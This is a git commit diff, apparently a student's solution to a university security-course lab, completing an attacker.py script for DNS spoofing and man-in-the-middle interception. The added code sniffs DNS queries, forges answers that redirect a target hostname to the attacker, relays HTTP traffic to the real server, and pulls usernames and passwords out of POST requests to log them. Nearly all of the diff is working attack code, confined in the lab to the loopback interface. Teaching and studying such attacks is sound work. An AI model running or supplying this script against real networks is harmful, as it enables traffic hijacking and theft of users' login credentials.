4b2f74833044f8c006804ad7135b6075d29e3480
Saleh <salihhassan@campus.technion.ac.il>
2024-03-07 12:10:17 +0200

    added attacker script

--- cs_236350/dns_spoofing_and_mitm/attacker/attacker.py
+++ cs_236350/dns_spoofing_and_mitm/attacker/attacker.py
@@ -24,29 +24,77 @@ def log_credentials(username, password):
 def check_credentials(client_data):
 	# TODO: Take a block of client data and search for username/password credentials.
 	# If found, log the credentials to the system by calling log_credentials().
-	raise NotImplementedError
+	conditions = ["POST", "username=", "password="]
+	if all(condition in client_data for condition in conditions):
+		user_and_after = client_data.split("username=")[1] # second half after the delimiter
+		user = user_and_after.split("&")[0] # first half befpre the delimiter
+		passwd_and_after = client_data.split("password=")[1]
+		passwd = passwd_and_after.split("&")[0]
+		log_credentials(user, passwd)
 
 
 def handle_tcp_forwarding(client_socket, client_ip, hostname):
 	# Continuously intercept new connections from the client
 	# and initiate a connection with the host in order to forward data
 
-	while True:
+	# TODO: accept a new connection from the client on client_socket and
+	# create a new socket to connect to the actual host associated with hostname.
 
-		# TODO: accept a new connection from the client on client_socket and
-		# create a new socket to connect to the actual host associated with hostname.
+	# TODO: read data from client socket, check for credentials, and forward along to host socket.
+	# Check for POST to '/post_logout' and exit after that request has completed.
 
-		# TODO: read data from client socket, check for credentials, and forward along to host socket.
-		# Check for POST to '/post_logout' and exit after that request has completed.
+	try:
+		while True:
 
-		raise NotImplementedError
+			accepted_socket, _ = client_socket.accept()
+			# Create a new socket to connect to the actual host associated with hostname
+			real_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			real_server_socket.connect((hostname, WEB_PORT)) # port = 80 is associated with HTTP
+			# Read data from client socket
+			client_data = accepted_socket.recv(8192) # allow 8192 Bytes = 8KB of data to be transfered
+			if not client_data:
+				break  # Break the loop if no data is received
+			else:
+				check_credentials(str(client_data)) # jackpot!
 
+			# Forward the received data to the host socket
+			real_server_socket.sendall(client_data)
+			real_server_response = real_server_socket.recv(8192)
+			accepted_socket.sendall(real_server_response)		
+
+			# Close the sockets
+			accepted_socket.close()
+			real_server_socket.close()
+
+			# Check if the received data contains a POST request to '/post_logout'
+			conditions = ["POST", "/post_logout"]
+			if all(condition in client_data for condition in conditions):
+				break  # Exit the loop if the condition is met
+
+	finally:
+		# Close the client socket
+		client_socket.close()
+		exit(0) # as note above, exit at the end after "/post_logout"
 
 def dns_callback(packet, extra_args):
 	# TODO: Write callback function for handling DNS packets.
 	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
-	raise NotImplementedError
+	
+	if packet.haslayer(DNS):
+		my_socket, source_ip = extra_args  # as we passed in sniff_and_spoof()
+		try:
+			pkt_ip = packet[IP]
+			pkt_udp = packet[UDP]
+			pkt_dns = packet[DNS]
+			pkt_dnsQR = packet[DNSQR]
+			QR_name = str(pkt_dnsQR.qname)
 
+			if HOSTNAME in QR_name:
+				my_response = IP(dst=pkt_ip.src, src=pkt_ip.dst) / UDP(dport=pkt_udp.sport, sport=pkt_udp.dport) / DNS(id=pkt_dns.id, qd=pkt_dnsQR, qr=1, aa=1, an=DNSRR(rrname=HOSTNAME, rdata=source_ip))
+				send(my_response, iface="lo")
+				handle_tcp_forwarding(my_socket, source_ip, HOSTNAME)
+		except Exception as e:
+			print("Error processing packet:", e)
 
 def sniff_and_spoof(source_ip):
 	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT.
@@ -54,7 +102,29 @@ def sniff_and_spoof(source_ip):
 
 	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
 	# and the socket you created as extra callback arguments. 
-	raise NotImplementedError
+	my_socket = None
+	try:
+		my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket.AF_INET tells socket to use IPV4, socket.SOCK_STREAM indicates a stream oriented socket.
+		my_socket.bind((source_ip, WEB_PORT)) # bind socket to (source_ip, WEB_PORT)
+		my_socket.listen()
+	except Exception as e:
+		print("Error: Failed to create or bind socket:", e)
+		if my_socket:
+			my_socket.close()
+		sys.exit(1)
+
+	try:
+		# Sniff for DNS packets on the network
+		sniff(filter="udp port 53", iface="lo", prn=lambda pkt: dns_callback(pkt, (my_socket, source_ip)))
+	except Exception as e:
+		print("Error: Failed to sniff packets:", e)
+	finally:
+	# Close the socket
+		if my_socket:
+			my_socket.close()
+
+	# Exit the script
+	sys.exit(0)
 
 
 def main():
